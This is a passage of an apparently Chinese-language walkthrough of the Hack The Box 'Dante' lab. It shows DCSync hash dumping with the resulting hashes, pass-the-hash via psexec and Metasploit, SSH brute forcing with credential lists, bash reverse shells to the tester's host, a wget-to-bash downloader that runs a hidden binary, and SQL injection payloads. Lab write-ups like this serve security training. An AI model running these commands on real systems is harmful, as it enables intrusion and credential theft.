</span><span class="mi">2023</span><span class="nt">-12-29T14</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mf">25.0169982</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">Flags:</span><span class="w"> </span><span class="nx">Group</span><span class="p">,</span><span class="w"> </span><span class="nx">LocalAdmin</span><span class="p">,</span><span class="w"> </span><span class="nx">GPOLocalGroup</span><span class="p">,</span><span class="w"> </span><span class="nx">Session</span><span class="p">,</span><span class="w"> </span><span class="nx">LoggedOn</span><span class="p">,</span><span class="w"> </span><span class="nx">Trusts</span><span class="p">,</span><span class="w"> </span><span class="nx">ACL</span><span class="p">,</span><span class="w"> </span><span class="nx">Container</span><span class="p">,</span><span class="w"> </span><span class="nx">RDP</span><span class="p">,</span><span class="w"> </span><span class="nx">ObjectProps</span><span class="p">,</span><span class="w"> </span><span class="nx">DCOM</span><span class="p">,</span><span class="w"> </span><span class="nx">SPNTargets</span><span class="p">,</span><span class="w"> </span><span class="nx">PSRemote</span><span class="w">
</span><span class="mi">2023</span><span class="nt">-12-29T14</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mf">25.1263707</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">Beginning</span><span class="w"> </span><span class="nx">LDAP</span><span class="w"> </span><span class="nx">search</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">DANTE.ADMIN</span><span class="w">
</span><span class="mi">2023</span><span class="nt">-12-29T14</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mf">25.1419972</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">Producer</span><span class="w"> </span><span class="nx">has</span><span class="w"> </span><span class="nx">finished</span><span class="p">,</span><span class="w"> </span><span class="nx">closing</span><span class="w"> </span><span class="nx">LDAP</span><span class="w"> </span><span class="nx">channel</span><span class="w">
</span><span class="mi">2023</span><span class="nt">-12-29T14</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mf">25.1419972</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">LDAP</span><span class="w"> </span><span class="nx">channel</span><span class="w"> </span><span class="nx">closed</span><span class="p">,</span><span class="w"> </span><span class="nx">waiting</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">consumers</span><span class="w">
</span><span class="mi">2023</span><span class="nt">-12-29T14</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mf">55.9584256</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">Status:</span><span class="w"> </span><span class="nx">0</span><span class="w"> </span><span class="nx">objects</span><span class="w"> </span><span class="nx">finished</span><span class="w"> </span><span class="p">(</span><span class="o">+</span><span class="mi">0</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="n">/s</span><span class="w"> </span><span class="o">--</span><span class="w"> </span><span class="nx">Using</span><span class="w"> </span><span class="nx">35</span><span class="w"> </span><span class="nx">MB</span><span class="w"> </span><span class="nx">RAM</span><span class="w">
</span><span class="mi">2023</span><span class="nt">-12-29T14</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mf">09.6121665</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">Consumers</span><span class="w"> </span><span class="nx">finished</span><span class="p">,</span><span class="w"> </span><span class="nx">closing</span><span class="w"> </span><span class="nx">output</span><span class="w"> </span><span class="nx">channel</span><span class="w">
</span><span class="mi">2023</span><span class="nt">-12-29T14</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mf">09.6433466</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">Output</span><span class="w"> </span><span class="nx">channel</span><span class="w"> </span><span class="nx">closed</span><span class="p">,</span><span class="w"> </span><span class="nx">waiting</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">output</span><span class="w"> </span><span class="nx">task</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">complete</span><span class="w">
</span><span class="n">Closing</span><span class="w"> </span><span class="nx">writers</span><span class="w">
</span><span class="mi">2023</span><span class="nt">-12-29T14</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mf">09.7527055</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">Status:</span><span class="w"> </span><span class="nx">92</span><span class="w"> </span><span class="nx">objects</span><span class="w"> </span><span class="nx">finished</span><span class="w"> </span><span class="p">(</span><span class="o">+</span><span class="mi">92</span><span class="w"> </span><span class="mf">2.090909</span><span class="p">)</span><span class="n">/s</span><span class="w"> </span><span class="o">--</span><span class="w"> </span><span class="nx">Using</span><span class="w"> </span><span class="nx">42</span><span class="w"> </span><span class="nx">MB</span><span class="w"> </span><span class="nx">RAM</span><span class="w">
</span><span class="mi">2023</span><span class="nt">-12-29T14</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mf">09.7527055</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">Enumeration</span><span class="w"> </span><span class="nx">finished</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">00:00:44.6321094</span><span class="w">
</span><span class="mi">2023</span><span class="nt">-12-29T14</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mf">09.8151969</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">Saving</span><span class="w"> </span><span class="nx">cache</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">stats:</span><span class="w"> </span><span class="nx">51</span><span class="w"> </span><span class="nx">ID</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">type</span><span class="w"> </span><span class="nx">mappings.</span><span class="w">
 </span><span class="mi">52</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">SID</span><span class="w"> </span><span class="nx">mappings.</span><span class="w">
 </span><span class="mi">0</span><span class="w"> </span><span class="n">machine</span><span class="w"> </span><span class="nx">sid</span><span class="w"> </span><span class="nx">mappings.</span><span class="w">
 </span><span class="mi">2</span><span class="w"> </span><span class="n">sid</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">domain</span><span class="w"> </span><span class="nx">mappings.</span><span class="w">
 </span><span class="mi">0</span><span class="w"> </span><span class="n">global</span><span class="w"> </span><span class="nx">catalog</span><span class="w"> </span><span class="nx">mappings.</span><span class="w">
</span><span class="mi">2023</span><span class="nt">-12-29T14</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mf">09.8308184</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">SharpHound</span><span class="w"> </span><span class="nx">Enumeration</span><span class="w"> </span><span class="nx">Completed</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">14:04</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">29/12/2023</span><span class="o">!</span><span class="w"> </span><span class="nx">Happy</span><span class="w"> </span><span class="nx">Graphing</span><span class="o">!</span><span class="w">
</span></code></pre></div></div>

<p>导入结果之后查看 JBERCOV 的信息，可以发现 JBERCOV 用户具备 GetChangesAll 权限，而 GetChangesAll 权限意味着可以利用 DCSync 导出域内的所有 hash。</p>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231229082415.png" alt="20231229082415" /></p>

<!-- ![Alt text](../../../../../assets/image-10.png) -->

<p>通常情况下 DCSync 权限仅有管理员、域管理员、企业管理员和域控制器组的成员才具备，但这里 JBERCOV 用户并不是管理员用户，属于 DACL 滥用。</p>

<p>域服务中资源的访问权限通常通过使用访问控制条目 (ACE) 来授予，DACL（Active Directory 自主访问控制列表）是由 ACE（访问控制条目）组成的列表，用于标识允许或拒绝访问对象的用户和组。</p>

<p>DACL 滥用通常可以使用 BloodHound、Powersploit 中的 Get-DomainObjectAcl 来进行枚举。</p>

<p>DACL 滥用的思维导图如下：
<img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231229082957.png" alt="20231229082957" /></p>

<!-- ![Alt text](../../../../../assets/image-11.png) -->

<p>接着我们可以使用 secretdump 来导出域控中的 hash</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p <span class="nt">-q</span> <span class="nt">-f</span> proxychains_1088.conf secretsdump.py <span class="nt">-outputfile</span> 172.16.2.5_DCSync DANTE.ADMIN/jbercov:myspace7@172.16.2.5
</code></pre></div></div>
<p>结果如下：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:4c827b7074e99eefd49d05872185f7f8:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2e5f00bc433acee0ae72f622450bd63c:::
DANTE.ADMIN<span class="se">\j</span>bercov:1106:aad3b435b51404eeaad3b435b51404ee:2747def689b576780fe2339fd596688c:::
DANTE-DC02<span class="nv">$:</span>1000:aad3b435b51404eeaad3b435b51404ee:698534680cb407112e87a196bccb2e1f:::
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:0652a9eb0b8463a8ca287fc5d099076fbbd5f1d4bc0b94466ccbcc5c4a186095
Administrator:aes128-cts-hmac-sha1-96:08f140624c46af979044dde5fff44cfd
Administrator:des-cbc-md5:8ac752cea84f4a10
krbtgt:aes256-cts-hmac-sha1-96:a696318416d7e5d58b1b5763f1a9b7f2aa23ca743ac3b16990e5069426d4bc46
krbtgt:aes128-cts-hmac-sha1-96:783ecc93806090e2b21d88160905dc36
krbtgt:des-cbc-md5:dcbff8a80b5b343e
DANTE.ADMIN<span class="se">\j</span>bercov:aes256-cts-hmac-sha1-96:5b4b2e67112ac898f13fc8b686c07a43655c5b88c9ba7e5b48b1383bc5b3a3b6
DANTE.ADMIN<span class="se">\j</span>bercov:aes128-cts-hmac-sha1-96:489ca03ed99b1cb73e7a28c242328d0d
DANTE.ADMIN<span class="se">\j</span>bercov:des-cbc-md5:c7e08938cb7f929d
DANTE-DC02<span class="nv">$:</span>aes256-cts-hmac-sha1-96:ad70e34f55fb662789158a2a9fd111aa2042a651e518e5e83b8592c35d9f3bce
DANTE-DC02<span class="nv">$:</span>aes128-cts-hmac-sha1-96:4c917008232d55247ef311d89437a078
DANTE-DC02<span class="nv">$:</span>des-cbc-md5:b5497fb9eac17f5d
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Cleaning up...
</code></pre></div></div>
<h2 id="提权-hash-传递">提权: Hash 传递</h2>
<p>有了 Administrator 的 Hash 之后，我们可以使用 Pass the Hash 来获取 Administrator 权限。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p <span class="nt">-q</span> <span class="nt">-f</span> proxychains_1088.conf psexec.py <span class="nt">-hashes</span> <span class="s1">'aad3b435b51404eeaad3b435b51404ee:4c827b7074e99eefd49d05872185f7f8'</span> <span class="s1">'DANTE.ADMIN/Administrator@172.16.2.5'</span>

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on 172.16.2.5.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file kvzbKpgP.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on 172.16.2.5.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service fuZm on 172.16.2.5.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service fuZm.....
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
Microsoft Windows <span class="o">[</span>Version 10.0.17763.1490]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; 
</code></pre></div></div>

<p>c:\Users\Administrator\Desktop 下有 flag.txt 和 Note.txt，Note.txt 内容如下，提示我们其实可以通过枚举 DC01 的浏览器记录来找到 172.16.2.0/24 网段。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>You were supposed to find this subnet via enumerating the browser <span class="nb">history </span>files on DC01.

172.16.1.10 can also pivot to this box, it may be a bit more stable than DC01.
</code></pre></div></div>
<p>c:\Users\Administrator\Documents 目录下还有一个 Jenkins.bat 文件。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net user Admin_129834765 SamsungOctober102030 /add
</code></pre></div></div>
<p>得到了一个用户凭证，可能与 172.16.1.19 中的 jenkins 有关。</p>

<p>除了使用 impacket 中的 psexec.py 外，msf 中也集成了模块利用。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/windows/smb/psexec
<span class="nb">set </span>rhosts 172.16.2.5
<span class="nb">set </span>proxies socks5:127.0.0.1:1088
<span class="nb">set </span>smbuser Administrator
<span class="nb">set </span>SMBPass aad3b435b51404eeaad3b435b51404ee:4c827b7074e99eefd49d05872185f7f8
<span class="nb">set </span>lhost 10.10.14.5
<span class="nb">set </span>reverseallowproxy <span class="nb">true
set </span>DisablePayloadHandler <span class="nb">true
set </span>payload windows/x64/meterpreter/reverse_tcp
<span class="nb">set </span>LPORT 1235
run
</code></pre></div></div>

<h2 id="主机存活性扫描-1">主机存活性扫描</h2>
<p>得到域控权限后，可以进一步探测 172.16.2.0/24 网段存活的主机。</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="kr">for</span><span class="w"> </span><span class="n">/L</span><span class="w"> </span><span class="o">%</span><span class="nx">a</span><span class="w"> </span><span class="nx">IN</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">254</span><span class="p">)</span><span class="w"> </span><span class="kr">DO</span><span class="w"> </span><span class="n">ping</span><span class="w"> </span><span class="nx">/n</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nx">/w</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nx">172.16.2.</span><span class="o">%</span><span class="nx">a</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">find</span><span class="w"> </span><span class="s2">"Reply"</span><span class="w">

</span><span class="n">Reply</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">172.16.2.5:</span><span class="w"> </span><span class="nx">bytes</span><span class="o">=</span><span class="mi">32</span><span class="w"> </span><span class="n">time</span><span class="err">&lt;</span><span class="nx">1ms</span><span class="w"> </span><span class="nx">TTL</span><span class="o">=</span><span class="mi">128</span><span class="w">
</span><span class="n">Reply</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">172.16.2.101:</span><span class="w"> </span><span class="nx">bytes</span><span class="o">=</span><span class="mi">32</span><span class="w"> </span><span class="n">time</span><span class="err">&lt;</span><span class="nx">1ms</span><span class="w"> </span><span class="nx">TTL</span><span class="o">=</span><span class="mi">64</span><span class="w">
</span></code></pre></div></div>
<p>172.16.2.0/24 除了域控只有 172.16.2.101 这台主机</p>

<h1 id="linux-172162101">Linux: 172.16.2.101</h1>
<h2 id="端口扫描-1">端口扫描</h2>
<p>在 172.16.2.5 使用 msf 对 172.16.2.101 进行端口扫描</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use auxiliary/scanner/portscan/tcp
<span class="nb">set </span>RHOSTS 172.16.2.101
<span class="nb">set </span>THREADS 10
run
</code></pre></div></div>
<p>仅开放一个 ssh 服务</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>+] 172.16.2.101:         - 172.16.2.101:22 - TCP OPEN
</code></pre></div></div>

<h2 id="ssh-爆破">SSH 爆破</h2>
<p>msf 中可以使用 auxiliary/scanner/ssh/ssh_login 模块来爆破 ssh</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use auxiliary/scanner/ssh/ssh_login
<span class="nb">set </span>USERPASS_FILE /project/HTB/ProLab/Dante/combine_msf.txt
<span class="nb">set </span>RHOSTS 172.16.2.101
<span class="nb">set </span>VERBOSE <span class="nb">true
set </span>ThREADS 10
run

<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.2.101:22 - Starting bruteforce
<span class="o">[</span>-] 172.16.2.101:22 - Failed: <span class="s1">'asmith:Princess1'</span>
<span class="o">[!]</span> No active DB <span class="nt">--</span> Credential data will not be saved!
<span class="o">[</span>-] 172.16.2.101:22 - Failed: <span class="s1">'smoggat:Summer2019'</span>
<span class="o">[</span>-] 172.16.2.101:22 - Failed: <span class="s1">'tmodle:P45678!'</span>
<span class="o">[</span>-] 172.16.2.101:22 - Failed: <span class="s1">'ccraven:Password1'</span>
<span class="o">[</span>-] 172.16.2.101:22 - Failed: <span class="s1">'kploty:Teacher65'</span>
<span class="o">[</span>-] 172.16.2.101:22 - Failed: <span class="s1">'jbercov:4567Holiday1'</span>
<span class="o">[</span>-] 172.16.2.101:22 - Failed: <span class="s1">'whaguey:acb123'</span>
<span class="o">[</span>-] 172.16.2.101:22 - Failed: <span class="s1">'dcamtan:WorldOfWarcraft67'</span>
<span class="o">[</span>-] 172.16.2.101:22 - Failed: <span class="s1">'tspadly:RopeBlackfieldForwardslash'</span>
<span class="o">[</span>-] 172.16.2.101:22 - Failed: <span class="s1">'ematlis:JuneJuly1TY'</span>
<span class="o">[</span>-] 172.16.2.101:22 - Failed: <span class="s1">'fglacdon:FinalFantasy7'</span>
<span class="o">[</span>-] 172.16.2.101:22 - Failed: <span class="s1">'tmentrso:65RedBalloons'</span>
<span class="o">[</span>-] 172.16.2.101:22 - Failed: <span class="s1">'dharding:WestminsterOrange5'</span>
<span class="o">[</span>-] 172.16.2.101:22 - Failed: <span class="s1">'smillar:MarksAndSparks91'</span>
<span class="o">[</span>-] 172.16.2.101:22 - Failed: <span class="s1">'bjohnston:Bullingdon1'</span>
<span class="o">[</span>-] 172.16.2.101:22 - Failed: <span class="s1">'iahmed:Sheffield23'</span>
<span class="o">[</span>-] 172.16.2.101:22 - Failed: <span class="s1">'plongbottom:PowerfixSaturdayClub777'</span>
<span class="o">[</span>-] 172.16.2.101:22 - Failed: <span class="s1">'jcarrot:Tanenbaum0001'</span>
<span class="o">[</span>-] 172.16.2.101:22 - Failed: <span class="s1">'lgesley:SuperStrongCantForget123456789'</span>
<span class="o">[</span>+] 172.16.2.101:22 - Success: <span class="s1">'julian:manchesterunited'</span> <span class="s1">'uid=1001(julian) gid=1001(julian) groups=1001(julian) Linux DANTE-ADMIN-NIX05 5.4.0-39-generic #43-Ubuntu SMP Fri Jun 19 10:28:31 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux '</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> SSH session 5 opened <span class="o">(</span>10.10.14.5-10.10.110.3:57306 -&gt; 172.16.2.101:22<span class="o">)</span> at 2024-01-01 20:49:15 <span class="nt">-0500</span>

</code></pre></div></div>
<p>登陆成功之后 msf 会自动打开一个 ssh session</p>

<h2 id="提权至-root-polkitcve-2021-3560">提权至 root: polkit:CVE-2021-3560</h2>
<p>使用 linPEAS 进行提权信息收集</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># linPEAS</span>
nc <span class="nt">-lvnp</span> 9002 | <span class="nb">tee </span>linpeas.out <span class="c">#Host</span>
wget <span class="nt">-q</span> <span class="nt">-O-</span> 10.10.14.5:9999/linpeas.sh | sh | nc 10.10.14.5 9002 <span class="c">#Victim</span>
</code></pre></div></div>

<p>反弹一个 shell 到 pwncat，方便上传下载文件。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.5/9897 0&gt;&amp;1
</code></pre></div></div>

<p>Dante 靶场可能比较老了，基本上 linux 提权都可以用 polkit:CVE-2021-3560 打通，上传 trator 可以直接提权到 root。</p>

<h2 id="提权-suid-文件溢出漏洞提权">提权: SUID 文件溢出漏洞提权</h2>
<p>linPEAS 结果文件中关于 SUID 文件的描述存在如下的一个条目，readfile 并不是 linux 原生的二进制文件。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-rwsr-sr-x</span> 1 root julian 17K Jun 30  2020 /usr/sbin/readfile <span class="o">(</span>Unknown SUID binary!<span class="o">)</span>
</code></pre></div></div>
<p>原思路是利用 readfile 中存在的溢出漏洞提权至 root。</p>

<h2 id="主机存活性探测">主机存活性探测</h2>
<p>再在 172.16.2.101 中使用 ping 探测主机存活时，可以额外扫出来一个 172.16.2.6，此前在 172.16.2.5 中没有扫描出该主机的原因可能在于防火墙策略的限制。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>i <span class="k">in</span> <span class="o">{</span>1..255<span class="o">}</span><span class="p">;</span><span class="k">do</span> <span class="o">(</span>ping <span class="nt">-c</span> 1 172.16.2.<span class="nv">$i</span> | <span class="nb">grep</span> <span class="s2">"bytes from"</span>|cut <span class="nt">-d</span> <span class="s1">' '</span> <span class="nt">-f4</span>|tr <span class="nt">-d</span> <span class="s1">':'</span> &amp;<span class="o">)</span><span class="p">;</span><span class="k">done

</span>172.16.2.5
172.16.2.6
172.16.2.101
</code></pre></div></div>
<h2 id="反弹-msf-meterpreter">反弹 msf meterpreter</h2>
<p>为了进一步渗透 172.16.2.6，我们可以反弹一个 msf meterpreter。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget <span class="nt">-q</span> <span class="nt">-O-</span> 10.10.14.5:9999/downloader.sh|bash
</code></pre></div></div>
<p>downloader.sh 内容：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
wget <span class="nt">-q</span> http://10.10.14.5:9999/test <span class="nt">-O</span> .te
<span class="nb">chmod</span> +x .te
<span class="nb">nohup</span> ./.te &amp;
</code></pre></div></div>
<p>在新获取的 meterpreter 中添加路由：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>run autoroute <span class="nt">-s</span> 172.16.2.6
</code></pre></div></div>
<h1 id="linux-1721626">Linux: 172.16.2.6</h1>
<h2 id="端口扫描-2">端口扫描</h2>
<p>在 172.16.2.101 使用 msf 对 172.16.2.6 进行端口扫描</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use auxiliary/scanner/portscan/tcp
<span class="nb">set </span>RHOSTS 172.16.2.6
<span class="nb">set </span>THREADS 10
run
</code></pre></div></div>
<p>172.16.2.6 也同样仅开放 22 端口。</p>

<p>使用 julian:manchesterunited 可以成功登陆。</p>
<h2 id="ssh-爆破-1">SSH 爆破</h2>
<p>同样可以 SSH 爆破，下面的两个凭证均可以正常登陆</p>
<ul>
  <li>plongbottom:PowerfixSaturdayClub777</li>
  <li>julian:manchesterunited</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use auxiliary/scanner/ssh/ssh_login
<span class="nb">set </span>USERPASS_FILE /project/HTB/ProLab/Dante/combine_msf.txt
<span class="nb">set </span>RHOSTS 172.16.2.6
<span class="nb">set </span>VERBOSE <span class="nb">true
set </span>ThREADS 10
run

<span class="o">[</span>+] 172.16.2.6:22 - Success: <span class="s1">'plongbottom:PowerfixSaturdayClub777'</span> <span class="s1">'uid=1000(plongbottom) gid=1000(plongbottom) groups=1000(plongbottom),27(sudo) Linux DANTE-ADMIN-NIX06 5.3.0-61-generic #55~18.04.1-Ubuntu SMP Mon Jun 22 16:40:20 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux '</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> SSH session 7 opened <span class="o">(</span>10.10.14.5-10.10.110.3:42542 -&gt; 172.16.2.6:22<span class="o">)</span> at 2024-01-01 21:43:33 <span class="nt">-0500</span>
<span class="o">[</span>-] 172.16.2.6:22 - Failed: <span class="s1">'jcarrot:Tanenbaum0001'</span>
<span class="o">[</span>-] 172.16.2.6:22 - Failed: <span class="s1">'lgesley:SuperStrongCantForget123456789'</span>
<span class="o">[</span>+] 172.16.2.6:22 - Success: <span class="s1">'julian:manchesterunited'</span> <span class="s1">'uid=1001(julian) gid=1001(julian) groups=1001(julian) Linux DANTE-ADMIN-NIX06 5.3.0-61-generic #55~18.04.1-Ubuntu SMP Mon Jun 22 16:40:20 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux '</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> SSH session 8 opened <span class="o">(</span>10.10.14.5-10.10.110.3:46782 -&gt; 172.16.2.6:22<span class="o">)</span> at 2024-01-01 21:43:56 <span class="nt">-0500</span>
</code></pre></div></div>

<p>msf 会自动反弹 shell，但这个 shell 不是很稳定，反弹到 pwncat 时出现 time out，可能是有防火墙</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.5/9897 0&gt;&amp;1

<span class="nt">-bash</span>: connect: Connection timed out
<span class="nt">-bash</span>: line 5: /dev/tcp/10.10.14.5/9896: Connection timed out
</code></pre></div></div>

<p>可以考虑直接在 172.16.2.101 中使用 ssh 登陆 172.16.2.6</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh plongbottom@172.16.2.6
</code></pre></div></div>
<h2 id="获取-sql-凭证">获取 SQL 凭证</h2>
<p>julian 的 home 目录可以找到一个 flag 和一个 SQL 文件：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@DANTE-ADMIN-NIX06:/home/julian/Desktop# <span class="nb">cat </span>SQL 
Hi Julian
I<span class="s1">'ve put this on your personal desktop as its probably the most secure 
place on the network!

Can you please ask Sophie to change her SQL password when she logs in
again? I'</span>ve reset it to TerrorInflictPurpleDirt996655 as it stands, but
obviously this is a tough one to remember

Maybe we should all get password managers?

Thanks,
James

</code></pre></div></div>
<p>可以获取到一个 sql 凭证：</p>
<ul>
  <li>Sophie/TerrorInflictPurpleDirt996655</li>
</ul>

<h2 id="提权-sudoers">提权: sudoers</h2>
<p>plongbottom 用户属于 sudoers，因此可以直接 su 提权。</p>

<p>注意 msf 获取的反向 shell 无法使用 tty，sudo 会报错。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>su
<span class="nb">sudo</span>: no <span class="nb">tty </span>present and no askpass program specified
</code></pre></div></div>

<h1 id="windows-17216113">Windows: 172.16.1.13</h1>
<p>开放端口：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>172.16.1.13	80
172.16.1.13	443
172.16.1.13	445
</code></pre></div></div>

<h2 id="80-端口-rce">80 端口 RCE</h2>
<p>80 端口部署了一个 XAMPP。/phpinfo.php 可以访问 phpinfo。/phpmyadmin 只能通过本机 IP 进行登陆。</p>

<p>爆破 web 目录可以得到：</p>
<ol>
  <li>/cgi-bin/printenv.pl 可以输出一些环境信息。</li>
  <li>/discuss 可以进入一个 Dante Technical Discussion Forum 页面。</li>
</ol>

<p>页面提供了注册功能，可以注册一个用户，登陆之后可以修改用户信息，修改界面存在 sql 注入。</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># country 返回 1
un=dr34d&amp;fn=dr34d&amp;pwd=dr34d&amp;e_mail=dr34d%40gmail.com&amp;gender=1&amp;dob=1987-08-21&amp;ima=images.jpeg&amp;add=USA&amp;sta=USA&amp;cou=USA'or+1=1#

# country 返回 0
un=dr34d&amp;fn=dr34d&amp;pwd=dr34d&amp;e_mail=dr34d%40gmail.com&amp;gender=1&amp;dob=1987-08-21&amp;ima=images.jpeg&amp;add=USA&amp;sta=USA&amp;cou=USA'or+1=1#
</code></pre></div></div>
<p>并且如果对 /discuss/ 目录进行扫描，可以发现 /discuss/db/，可直接下载数据库文件 tech_forum.sql。</p>

<p>最后发现存在历史漏洞：</p>
<ul>
  <li><a href="https://www.exploit-db.com/exploits/48512">Online Discussion Forum Site 1.0 - Remote Code Execution - PHP webapps Exploit</a></li>
